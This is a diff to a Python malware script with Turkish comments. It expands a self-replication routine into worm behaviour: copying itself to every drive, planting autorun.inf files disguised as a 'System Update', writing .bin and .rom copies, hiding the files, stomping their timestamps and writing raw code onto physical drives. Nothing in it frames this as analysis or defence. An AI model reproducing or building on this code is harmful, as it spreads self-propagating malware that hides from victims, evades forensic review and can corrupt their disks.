@@ -538,27 +538,87 @@ WantedBy=default.target
         log_error(f"Persistence failed: {str(e)}")
         return success
 
-# Kendini kopyalama
+# Kendini kopyalama (Güncellendi)
 def self_replicate():
     try:
-        target_dirs = [os.path.expanduser("~"), r"C:\ProgramData", "/tmp"] if is_windows else ["/tmp", "/var/tmp"]
+        # Mevcut diskleri tespit et
+        drives = []
+        if is_windows:
+            import win32api
+            drives = win32api.GetLogicalDriveStrings().split('\0')[:-1]
+        else:
+            drives = [part.mountpoint for part in psutil.disk_partitions() if 'cdrom' not in part.opts.lower()]
+
         success = False
-        for target_dir in target_dirs:
+        # Kendi kodunu oku
+        with open(__file__, "r") as src:
+            self_code = src.read()
+
+        # Her diske kopyala
+        for drive in drives:
             try:
+                # Ana betiği kopyala
                 copy_name = f"sys_update_{random.randint(1000, 9999)}_{uuid.uuid4()}.py"
-                copy_path = os.path.join(target_dir, copy_name)
-                with open(__file__, "r") as src, open(copy_path, "w") as dst:
-                    dst.write(src.read())
+                copy_path = os.path.join(drive, copy_name)
+                with open(copy_path, "w") as dst:
+                    dst.write(self_code)
+                
+                # Autorun.inf dosyası oluştur
+                autorun_path = os.path.join(drive, "autorun.inf")
+                with open(autorun_path, "w") as f:
+                    f.write(f"""
+[AutoRun]
+open={sys.executable} {copy_path} silent
+action=Run System Update
+""")
+                
+                # .bin ve .rom dosyaları oluştur
+                bin_path = os.path.join(drive, f"sys_{uuid.uuid4()}.bin")
+                rom_path = os.path.join(drive, f"sys_{uuid.uuid4()}.rom")
+                with open(bin_path, "w") as f:
+                    f.write(self_code)
+                with open(rom_path, "w") as f:
+                    f.write(self_code)
+                
+                # Dosyaları gizle ve zaman damgasını ayarla
                 if is_windows:
                     import win32api
                     import win32con
-                    win32api.SetFileAttributes(copy_path, win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)
+                    for path in [copy_path, autorun_path, bin_path, rom_path]:
+                        win32api.SetFileAttributes(path, win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)
                 else:
-                    os.chmod(copy_path, 0o600)
+                    for path in [copy_path, autorun_path, bin_path, rom_path]:
+                        os.chmod(path, 0o600)
+                
                 file_time_stomping(copy_path)
+                file_time_stomping(autorun_path)
+                file_time_stomping(bin_path)
+                file_time_stomping(rom_path)
                 success = True
             except Exception as e:
-                log_error(f"Self Replication failed for {target_dir}: {str(e)}")
+                log_error(f"Self Replication failed for {drive}: {str(e)}")
+
+        # Gizli ve sistem disk bölümlerine yazmayı dene (bir kez)
+        if is_windows:
+            try:
+                import win32com.client
+                wmi = win32com.client.GetObject("winmgmts:")
+                partitions = wmi.ExecQuery("SELECT * FROM Win32_DiskPartition WHERE Bootable = False AND Type LIKE '%System%'")
+                for partition in partitions:
+                    try:
+                        disk_index = partition.DiskIndex
+                        partition_index = partition.Index
+                        hidden_path = f"\\\\.\\PhysicalDrive{disk_index}"
+                        copy_name = f"sys_hidden_{uuid.uuid4()}.py"
+                        with open(hidden_path, "w") as f:
+                            f.write(self_code)
+                        success = True
+                    except Exception as e:
+                        log_error(f"Hidden partition write failed for {hidden_path}: {str(e)}")
+                        continue  # Hata durumunda tekrar deneme
+            except Exception as e:
+                log_error(f"Hidden partition detection failed: {str(e)}")
+
         return success
     except Exception as e:
         log_error(f"Self Replication failed: {str(e)}")
